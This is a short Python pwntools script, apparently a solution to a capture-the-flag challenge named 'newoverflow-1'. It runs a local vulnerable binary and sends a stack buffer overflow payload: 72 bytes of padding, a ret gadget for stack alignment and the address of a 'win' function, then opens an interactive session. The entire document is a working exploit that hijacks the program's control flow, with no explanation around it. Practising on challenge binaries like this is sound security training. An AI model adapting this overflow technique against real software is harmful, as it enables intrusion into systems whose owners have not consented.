from pwn import *

p = process("/problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123/vuln", cwd="/problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123/vuln")

win_addr = 0x0000000000400767

offset = 72

payload = b""
payload += b"A"*72
payload += p64(0x00000000004005de) #: ret
payload += p64(win_addr)

p.recvline()
p.sendline(payload)
p.interactive()

p.close()
